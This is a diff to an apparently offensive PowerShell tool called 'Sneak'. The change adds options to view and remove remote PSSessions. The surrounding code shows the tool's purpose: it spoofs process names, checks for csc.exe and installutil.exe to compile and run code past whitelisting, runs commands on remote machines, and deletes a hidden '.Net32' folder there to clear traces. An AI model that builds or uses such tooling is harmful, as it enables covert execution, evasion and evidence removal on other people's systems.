@@ -20,8 +20,13 @@ options
 -RunRemote         Runs the commands remotely
 -Spoof             Spoofs the process as the chosen Spoofname
 -Outfilename       The name of the file you want to output to(not path) used with Out switch if required output
--Out               Outputs results to local host" -ForegroundColor Yellow
+-Out               Outputs results to local host
+-ViewSessions      Views all sessions you are connected to
+-RemoveSession     Removes a session you are connected to" -ForegroundColor Yellow
 
+$sessions=(Get-PSSession).Id
+$count=$sessions.count
+Write-Host "You have $count Sessions open" -ForegroundColor Green
 
 function Sneak{
 [CmdletBinding(DefaultParameterSetName="Local")]
@@ -32,6 +37,7 @@ param(
 [validatenotnull()] [string]$filepath,
 [parameter(ParameterSetname="Remote")]
 [parameter(ParameterSetname="Test")]
+[parameter(ParameterSetname="Remove")]
 [validatenotnull()]
 [string]$remotemachine,
 [parameter(ParameterSetname="Test")]
@@ -54,11 +60,24 @@ param(
 [parameter(ParameterSetname="Remote")]
 [string]$Outfilename,
 [parameter(ParameterSetname="Remote")]
-[switch]$Out
+[switch]$Out,
+[parameter(ParameterSetname="Remove")]
+[switch]$RemoveSession,
+[parameter(ParameterSetname="View")]
+[switch]$ViewSessions
 )
 $realpath="C:\Windows\Microsoft.NET\Framework64\v2.0.50727\"
 $pathcheck1=Test-Path "$realpath\csc.exe"
 $pathcheck2=Test-Path "$realpath\installutil.exe"
+if($ViewSessions){
+$sessions=(Get-PSSession).Id
+$count=$sessions.count
+Get-PSSession
+Write-Host "You have $count Sessions open" -ForegroundColor Green
+}
+if($RemoveSession){
+Remove-PSSession -ComputerName $remotemachine
+}
 if($pathcheck1 -and $pathcheck2){
 Write-Host "You have the files necessary to go on" -ForegroundColor Green
 }#End If
@@ -171,7 +190,6 @@ Invoke-Command -Session $session{cd C:\Users}
 sleep -s 15
 Invoke-Command -Session $session {Remove-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32" -Recurse -Force}
 }#EndElse
-Remove-pssession -Computername $Remotemachine
 }#End RunRemote
 
 
